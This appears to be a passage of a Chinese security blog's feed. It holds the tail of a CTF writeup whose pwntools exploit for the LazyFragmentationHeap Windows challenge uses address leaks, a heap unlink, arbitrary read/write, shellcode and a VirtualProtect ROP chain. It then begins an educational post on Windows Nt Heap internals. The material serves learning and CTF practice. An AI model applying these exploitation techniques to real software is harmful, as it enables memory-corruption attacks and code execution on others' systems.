class="number">0x8</span>, p64(target_addr))</span><br><span class="line">        self.show(<span class="number">6</span>)</span><br><span class="line">        self.text_base = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) &lt;&lt; <span class="number">16</span></span><br><span class="line">        <span class="keyword">assert</span>(self.text_base &gt;&gt; <span class="number">24</span> != <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_ucrtbase</span><span class="params">(self)</span>:</span></span><br><span class="line">        target_addr = self.text_base + <span class="number">0x30A0</span> <span class="comment"># atoll_iat</span></span><br><span class="line">        self.read_file(<span class="number">8</span>, <span class="number">0x8</span>, p64(target_addr))</span><br><span class="line">        self.show(<span class="number">6</span>)</span><br><span class="line">        self.ucrtbase = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x67A30</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">leak_pioinfo</span><span class="params">(self)</span>:</span></span><br><span class="line">        target_addr = self.ucrtbase + <span class="number">0xF0980</span> <span class="comment"># ucrtbase!_pioinfo[0]</span></span><br><span class="line">        self.read_file(<span class="number">8</span>, <span class="number">0x8</span>, p64(target_addr))</span><br><span class="line">        self.show(<span class="number">6</span>)</span><br><span class="line">        self.pioinfo_offset = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        <span class="keyword">assert</span>(self.pioinfo_offset != <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_simple_leak</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.prepare()</span><br><span class="line">        self.leak_text_base()</span><br><span class="line">        self.p.close()</span><br><span class="line"></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.prepare()</span><br><span class="line">        self.leak_ucrtbase()</span><br><span class="line">        self.p.close()</span><br><span class="line"></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.prepare()</span><br><span class="line">        self.leak_pioinfo()</span><br><span class="line">        self.p.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_pioinfo</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.prepare()</span><br><span class="line">        pioinfo = (self.heap_addr &gt;&gt; <span class="number">16</span> &lt;&lt; <span class="number">16</span>) | self.pioinfo_offset</span><br><span class="line">        self.read_file(<span class="number">6</span>, <span class="number">8</span>, p64(pioinfo + <span class="number">0x38</span>))</span><br><span class="line">        self.edit(<span class="number">6</span>, <span class="string">"\x09"</span>) <span class="comment"># change to binary mode</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unlink_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.create(<span class="number">0x3C8</span>, <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">"\x00"</span> * <span class="number">0x58</span> <span class="comment"># padding</span></span><br><span class="line">        payload += p64(self.ctor_heap_head(<span class="number">0x380</span>, <span class="number">0x0</span>, <span class="number">0x380</span>, <span class="number">0x0</span>) ^ self.encoding) <span class="comment"># fake victim chunk head (freed status)</span></span><br><span class="line">        payload += p64(self.array_addr + <span class="number">0x28</span> * <span class="number">4</span> + <span class="number">0x20</span> - <span class="number">0x8</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">4</span> + <span class="number">0x20</span>)</span><br><span class="line">        self.edit(<span class="number">2</span>, payload)</span><br><span class="line">        self.delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">arbitrary_write</span><span class="params">(self, addr, content, final_write=False)</span>:</span></span><br><span class="line">        <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">        payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">7</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(addr)</span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">8</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">        self.edit(<span class="number">6</span>, payload)</span><br><span class="line">        self.edit(<span class="number">7</span>, content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> final_write == <span class="literal">False</span>:</span><br><span class="line">            <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">            payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">            self.edit(<span class="number">8</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">arbitrary_read</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">        payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">7</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(addr)</span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">8</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">        self.edit(<span class="number">6</span>, payload)</span><br><span class="line">        self.show(<span class="number">7</span>)</span><br><span class="line">        value = u64(self.p.recvline()[:<span class="number">-2</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># | edit_status | buffer |</span></span><br><span class="line">        payload = p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>) </span><br><span class="line">        self.edit(<span class="number">8</span>, payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search_ret_addr</span><span class="params">(self)</span>:</span></span><br><span class="line">        address = self.stack_end - <span class="number">0x8</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">8</span>):</span><br><span class="line">            val = self.arbitrary_read(address) </span><br><span class="line">            <span class="keyword">if</span> val == self.text_base + <span class="number">0x17C4</span>: <span class="comment"># return address of printf</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                address -= <span class="number">8</span></span><br><span class="line">        <span class="keyword">assert</span>(address !=self.stack_end - <span class="number">0x1000</span>)</span><br><span class="line">        <span class="keyword">return</span> address</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_shellcode</span><span class="params">(self)</span>:</span></span><br><span class="line">        _open = self.ucrtbase + <span class="number">0xA5550</span></span><br><span class="line">        _read = self.ucrtbase + <span class="number">0x182A0</span></span><br><span class="line">        _write = self.ucrtbase + <span class="number">0x17BA0</span></span><br><span class="line">        _exit = self.ucrtbase + <span class="number">0x74630</span></span><br><span class="line">        filename = self.text_base + <span class="number">0x5400</span> <span class="comment"># .data segment</span></span><br><span class="line">        buffer = self.text_base + <span class="number">0x5450</span> <span class="comment"># .data segment</span></span><br><span class="line">        shellcode_addr = self.text_base + <span class="number">0x5500</span> <span class="comment"># .data segment</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># args: rcx, rdx, r8, r9, (stack)</span></span><br><span class="line">        shellcode = <span class="string">r'''</span></span><br><span class="line"><span class="string">        open_file:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x  </span></span><br><span class="line"><span class="string">            mov rcx, 0x%x  </span></span><br><span class="line"><span class="string">            mov rdx, 0     </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        read_file:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x </span></span><br><span class="line"><span class="string">            mov rcx, rax   </span></span><br><span class="line"><span class="string">            mov rdx, 0x%x  </span></span><br><span class="line"><span class="string">            mov r8, 0x30   </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        write_file:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x </span></span><br><span class="line"><span class="string">            mov rcx, 1     </span></span><br><span class="line"><span class="string">            mov rdx, 0x%x  </span></span><br><span class="line"><span class="string">            mov r8, 0x30   </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        exit:</span></span><br><span class="line"><span class="string">            mov rdi, 0x%x </span></span><br><span class="line"><span class="string">            mov rdx, 1    </span></span><br><span class="line"><span class="string">            call rdi      </span></span><br><span class="line"><span class="string">        '''</span> % (_open, filename, _read, buffer, _write, buffer, _exit)\</span><br><span class="line"></span><br><span class="line">        self.arbitrary_write(shellcode_addr, asm(shellcode))</span><br><span class="line">        self.arbitrary_write(filename, <span class="string">"./flag.txt"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_rop</span><span class="params">(self)</span>:</span></span><br><span class="line">        data_segment = self.text_base + <span class="number">0x5000</span></span><br><span class="line">        shellcode_addr = data_segment + <span class="number">0x500</span></span><br><span class="line">        VirtualProtect = self.kernel32 + <span class="number">0x1BC70</span></span><br><span class="line">        pop_rcx_r8_r9_r10_r11 = self.ntdll + <span class="number">0x8c551</span> <span class="comment"># pop rcx ; pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret</span></span><br><span class="line">        pop_rdx_r11 = self.ntdll + <span class="number">0x8C557</span> <span class="comment"># pop rdx ; pop r11 ; ret</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># jmp shellcode</span></span><br><span class="line">        payload = p64(pop_rcx_r8_r9_r10_r11)</span><br><span class="line">        payload += p64(data_segment) + p64(<span class="number">0x40</span>) + p64(data_segment + <span class="number">0xA00</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 0x40 is PAGE_EXECUTE_READWRITE</span></span><br><span class="line">        payload += p64(pop_rdx_r11)</span><br><span class="line">        payload += p64(<span class="number">0x1000</span>) + p64(<span class="number">0</span>)</span><br><span class="line">        payload += p64(VirtualProtect)</span><br><span class="line">        payload += p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # system("cmd.exe") doesn't work, since LFH has broken</span></span><br><span class="line">        <span class="comment"># system = self.ucrtbase + 0xAE5C0</span></span><br><span class="line">        <span class="comment"># payload = p64(pop_rcx_r8_r9_r10_r11)</span></span><br><span class="line">        <span class="comment"># payload += p64(self.ret_address_in_stack + 0x40) + p64(0) + p64(0) + p64(0) + p64(0)</span></span><br><span class="line">        <span class="comment"># payload += p64(pop_rdx_r11 + 3)</span></span><br><span class="line">        <span class="comment"># payload += p64(system)</span></span><br><span class="line">        <span class="comment"># payload += "cmd.exe\x00"</span></span><br><span class="line"></span><br><span class="line">        self.arbitrary_write(self.ret_address_in_stack, payload, final_write=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.p = process(<span class="string">"./LazyFragmentationHeap.exe"</span>)</span><br><span class="line">        self.write_pioinfo()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># let chunk 5 points to itself</span></span><br><span class="line">        self.unlink_attack() </span><br><span class="line"></span><br><span class="line">        payload = <span class="string">"A"</span> * <span class="number">0x8</span> </span><br><span class="line">        <span class="comment"># | exist_status | size | id | edit_status | buffer |</span></span><br><span class="line">        payload += p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(<span class="number">0x378</span>) + p64(<span class="number">6</span>) + p64(<span class="number">0xDDAABEEF1ACD</span>) + p64(self.array_addr + <span class="number">0x28</span> * <span class="number">5</span> + <span class="number">0x18</span>)</span><br><span class="line">        self.edit(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># do arbitrary read and write</span></span><br><span class="line">        self.kernel32 = self.arbitrary_read(self.text_base + <span class="number">0x3028</span>) - <span class="number">0x24890</span> <span class="comment"># GetCurrentProcessId_iat in binary</span></span><br><span class="line">        self.ntdll = self.arbitrary_read(self.kernel32 + <span class="number">0x82888</span>) - <span class="number">0x8CBC0</span> <span class="comment"># atol_iat in kernel32</span></span><br><span class="line">        self.PEB = self.arbitrary_read(self.ntdll + <span class="number">0x16A448</span>) - <span class="number">0x80</span> <span class="comment"># ntdll!PebLdr - 0x78</span></span><br><span class="line">        self.TEB = self.PEB + <span class="number">0x1000</span></span><br><span class="line">        self.stack_end = (self.arbitrary_read(self.TEB + <span class="number">0x11</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x3000</span> </span><br><span class="line"></span><br><span class="line">        <span class="comment"># find where return address lies</span></span><br><span class="line">        self.ret_address_in_stack = self.search_ret_addr()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write shellcode</span></span><br><span class="line">        self.write_shellcode()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write ROP</span></span><br><span class="line">        self.debug()</span><br><span class="line">        self.write_rop()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_info</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] encoding is: %s "</span> % hex(self.encoding))</span><br><span class="line">        print(<span class="string">"[+] heap_base is: %s "</span> % hex(self.heap_addr))</span><br><span class="line">        print(<span class="string">"[+] text_base is: %s "</span> % hex(self.text_base))</span><br><span class="line">        print(<span class="string">"[+] ucrtbase is: %s "</span> % hex(self.ucrtbase))</span><br><span class="line">        print(<span class="string">"[+] pioinfo[0] offset is: %s "</span> % hex(self.pioinfo_offset))</span><br><span class="line">        print(<span class="string">"[+] kernel32 is: %s "</span> % hex(self.kernel32))</span><br><span class="line">        print(<span class="string">"[+] ntdll is: %s "</span> % hex(self.ntdll))</span><br><span class="line">        print(<span class="string">"[+] PEB is: %s "</span> % hex(self.PEB))</span><br><span class="line">        print(<span class="string">"[+] TEB is: %s "</span> % hex(self.TEB))</span><br><span class="line">        print(<span class="string">"[+] stack_end is: %s "</span> % hex(self.stack_end))</span><br><span class="line">        print(<span class="string">"[+] ret_address_in_stack is: %s "</span> % hex(self.ret_address_in_stack))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    attack = Attack()</span><br><span class="line">    attack.run()</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html" target="_blank" rel="noopener">https://whereisk0shl.top/hitb_gsec_ctf_babyshellcode_writeup.html</a></li><li><a href="https://bbs.pediy.com/thread-221016.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-221016.htm</a></li><li><a href="http://www.jbox.dk/sanos/source/win32/msvcrt/except.c.html" target="_blank" rel="noopener">http://www.jbox.dk/sanos/source/win32/msvcrt/except.c.html</a></li><li><a href="https://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup" target="_blank" rel="noopener">https://whereisk0shl.top/post/hitb_gsec_ctf_babystack_writeup</a></li><li><a href="https://www.anquanke.com/post/id/188170" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188170</a></li><li><a href="https://www.anquanke.com/post/id/188170#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188170#h3-4</a></li><li><a href="https://www.cnblogs.com/lanrenxinxin/p/4631836.html" target="_blank" rel="noopener">https://www.cnblogs.com/lanrenxinxin/p/4631836.html</a></li><li><a href="https://b0ldfrev.gitbook.io/note/windows_operating_system/windowsseh-li-yong" target="_blank" rel="noopener">https://b0ldfrev.gitbook.io/note/windows_operating_system/windowsseh-li-yong</a></li><li><a href="http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf" target="_blank" rel="noopener">http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf</a></li><li><a href="https://xz.aliyun.com/t/2587" target="_blank" rel="noopener">https://xz.aliyun.com/t/2587</a></li><li><a href="https://github.com/scwuaptx/LazyFragmentationHeap" target="_blank" rel="noopener">https://github.com/scwuaptx/LazyFragmentationHeap</a></li><li><a href="http://blog.eonew.cn/archives/1253#more-1253" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1253#more-1253</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本来去年暑假开始学习windows pwn，奈何需要备战考研所以搁置了，现在重新捡起来开始学习，记录一下BUUOJ上做的几个windows pwn题，总的来说windows pwn相对于linux pwn会略显复杂，机制更为繁琐，但是两者仍有一些共通之处。&lt;/p&gt;
&lt;p&gt;此外，有关windows的一些保护机制以及绕过方式，将会结合题目一起提到而并不打算单独拎出来做总结。其实这方面的内容网上也有非常多的参考资料，整理得也相当好了，我也就不做过多得重复工作，遇到的时候再稍做记录效率会高一些。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.com/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Learning Windows pwn -- Nt Heap</title>
    <link href="https://n0nop.com/2021/04/15/Learning-Windows-pwn-Nt-Heap/"/>
    <id>https://n0nop.com/2021/04/15/Learning-Windows-pwn-Nt-Heap/</id>
    <published>2021-04-15T09:32:42.000Z</published>
    <updated>2021-04-23T11:43:00.507Z</updated>
    
    <content type="html"><![CDATA[<p>最近正学习windows下的堆利用，本着扩展知识面再加上以后很大概率会用到的想法，从零开始学起，主要是从AngelBoy大神的Slides里面，再加上网上搜到的各种资料以及手动调试分析，试着去了解一下windows heap的管理机制。</p><p>不同于linux，由于windows是闭源的，一下子难以摸清，所以该篇会不断更新，目的仅是为了加深印象以及作为以后的参考。</p><a id="more"></a><h1 id="Win10内存管理机制概览"><a href="#Win10内存管理机制概览" class="headerlink" title="Win10内存管理机制概览"></a>Win10内存管理机制概览</h1><p>根据AngelBoy的Slides，Win10下的堆管理基址十分复杂，主要分为：</p><ul><li>Nt Heap: 默认使用的内存管理机制</li><li>SegmentHeap：Win10中全新的内存管理机制</li></ul><p>且其中SegmentHeap为部分系统程序以及UWP(Universal Windows Platform)使用，所以从这个角度来说，我们暂时只学习Nt Heap的内容，其他部分待未来学习加以补充。</p><h1 id="Nt-Heap-Overview"><a href="#Nt-Heap-Overview" class="headerlink" title="Nt Heap Overview"></a>Nt Heap Overview</h1><p>分析内存管理管理机制，当然同样是从<code>malloc</code>和<code>free</code>入手，借用一程图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">                                                                                        (Front-End)</span><br><span class="line">                                                                                        +-------------------------------+</span><br><span class="line">                                                                                        |           ntdll.dll           |</span><br><span class="line">                                                                                        +-------------------------------+</span><br><span class="line">                                                                                        | +---------------------------+ |</span><br><span class="line">                                                                      +--------------&gt;  | |    RtlpLowFragHeapAlloc   | |</span><br><span class="line">                                                                      |                 | |    RtlpLowFragHeapFree    | |</span><br><span class="line">                                                                      |                 | +---------------------------+ |</span><br><span class="line">                                                                      |                 +-------------------------------+</span><br><span class="line">                                                                      |                                | </span><br><span class="line">                                                                      |                                | </span><br><span class="line">                                                                      |                     (Back-End) V  </span><br><span class="line">+---------------+         +---------------------+         +-----------------------+         +-----------------------+</span><br><span class="line">| msvcrt140.dll |         |     Kernel32.dll    |         |       ntdll.dll       |         |       ntdll.dll       |</span><br><span class="line">+---------------+         +---------------------+         +-----------------------+         +-----------------------+</span><br><span class="line">| +-----------+ |         | +-----------------+ |         | +-------------------+ |         | +-------------------+ |</span><br><span class="line">| |   malloc  | |  ----&gt;  | |    HeapAlloc    | |  ----&gt;  | |  RtlAllocateHeap  | |  ----&gt;  | |  RtlpAllocateHeap | | </span><br><span class="line">| |    free   | |         | |    HeapFree     | |         | |    RtlFreeHeap    | |         | |    RtlpFreeHeap   | |</span><br><span class="line">| +-----------+ |         | +-----------------+ |         | +-------------------+ |         | +-------------------+ |</span><br><span class="line">+---------------+         +---------------------+         +-----------------------+         +-----------------------+</span><br><span class="line">                                                                                                       |</span><br><span class="line">                                                                                                       |</span><br><span class="line">                                                                                                       v</span><br><span class="line">                                                                                                 +------------+</span><br><span class="line">                                                                                                 |   Kernel   |</span><br><span class="line">                                                                                                 +------------+</span><br></pre></td></tr></table></figure><p>同时，从使用的角度来看，Win10堆可以分为两种：</p><ul><li>进程堆：整个进程共享，都可以使用，会存放在<code>_PEB</code>结构中。</li><li>私有堆：单独创建的，通过<code>HeapCreate</code>返回的句柄<code>hHeap</code>来指定。</li></ul><p>用一个程序简单测试一下，该测试程序主要是从一个新分配的私有堆上通过<code>HeapAlloc</code>不断分配空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr[<span class="number">30</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    HANDLE hHeap = HeapCreate(<span class="number">0</span>, <span class="number">0x10000</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i] = HeapAlloc(hHeap, <span class="number">0</span>, <span class="number">0xF0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] chunk[%02d] address is: %p\n"</span>, i, ptr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从输出中可以看出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[+] chunk[00] address is: 0000000000B50860</span><br><span class="line">[+] chunk[01] address is: 0000000000B50960</span><br><span class="line">[+] chunk[02] address is: 0000000000B50A60</span><br><span class="line">[+] chunk[03] address is: 0000000000B50B60</span><br><span class="line">[+] chunk[04] address is: 0000000000B50C60</span><br><span class="line">[+] chunk[05] address is: 0000000000B50D60</span><br><span class="line">[+] chunk[06] address is: 0000000000B50E60</span><br><span class="line">[+] chunk[07] address is: 0000000000B50F60</span><br><span class="line">[+] chunk[08] address is: 0000000000B51060</span><br><span class="line">[+] chunk[09] address is: 0000000000B51160</span><br><span class="line">[+] chunk[10] address is: 0000000000B51260</span><br><span class="line">[+] chunk[11] address is: 0000000000B51360</span><br><span class="line">[+] chunk[12] address is: 0000000000B51460</span><br><span class="line">[+] chunk[13] address is: 0000000000B51560</span><br><span class="line">[+] chunk[14] address is: 0000000000B51660</span><br><span class="line">[+] chunk[15] address is: 0000000000B51760</span><br><span class="line">[+] chunk[16] address is: 0000000000B51860</span><br><span class="line">[+] chunk[17] address is: 0000000000B50750</span><br><span class="line">[+] chunk[18] address is: 0000000000B54470</span><br><span class="line">[+] chunk[19] address is: 0000000000B55670</span><br><span class="line">[+] chunk[20] address is: 0000000000B54070</span><br><span class="line">[+] chunk[21] address is: 0000000000B54170</span><br><span class="line">[+] chunk[22] address is: 0000000000B54370</span><br><span class="line">[+] chunk[23] address is: 0000000000B55770</span><br><span class="line">[+] chunk[24] address is: 0000000000B54270</span><br><span class="line">[+] chunk[25] address is: 0000000000B54C70</span><br><span class="line">[+] chunk[26] address is: 0000000000B54A70</span><br><span class="line">[+] chunk[27] address is: 0000000000B55C70</span><br><span class="line">[+] chunk[28] address is: 0000000000B55070</span><br><span class="line">[+] chunk[29] address is: 0000000000B54570</span><br></pre></td></tr></table></figure><p>前17个chunk地址间隔固定，是由Back-End直接分配的；而后面的chunk地址开始变得随机，是由Front-End分配的。<br>也就是说，LFH机制是默认开启的，且只有在分配第18个chunk的时候才会开始启用。<br>至于底层细节，后文将会提到。</p><h1 id="Back-End"><a href="#Back-End" class="headerlink" title="Back-End"></a>Back-End</h1><h2 id="一些重要结构体"><a href="#一些重要结构体" class="headerlink" title="一些重要结构体"></a>一些重要结构体</h2><h3 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h3><p><code>_HEAP</code>结构体作为一个堆管理结构体，存放着许多的metadata，存在于每个堆的开头：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt _HEAP</span><br><span class="line">ntdll!_HEAP</span><br><span class="line">    